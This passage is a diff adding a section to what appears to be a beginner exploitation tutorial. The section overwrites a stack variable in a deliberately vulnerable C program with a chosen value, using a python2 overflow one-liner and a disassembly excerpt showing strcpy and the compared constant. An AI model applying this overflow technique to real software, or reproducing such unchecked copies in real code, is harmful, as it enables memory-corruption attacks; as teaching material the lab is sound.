@@ -41,3 +41,28 @@ This is because :
 
 Watch this video to get the idea:
 [video](https://www.youtube.com/watch?v=T03idxny9jE)
+
+
+Now lets modify to an specific value : 
+
+vuln-variable-specific.c
+
+this wil be with : 
+
+
+```
+./a.out $(python2 -c 'print "a"*(4*16) +  "\x64\x63\x62\x61"')
+
+```
+
+because : 
+
+```
+ 8048510:       8d 45 b4                lea    -0x4c(%ebp),%eax
+ 8048513:       50                      push   %eax
+ 8048514:       e8 77 fe ff ff          call   8048390 <strcpy@plt>
+ 8048519:       83 c4 10                add    $0x10,%esp
+ 804851c:       8b 45 f4                mov    -0xc(%ebp),%eax
+ 804851f:       3d 64 63 62 61          cmp    $0x61626364,%eax
+ 8048524:       75 12                   jne    8048538 <main+0x66>
+```
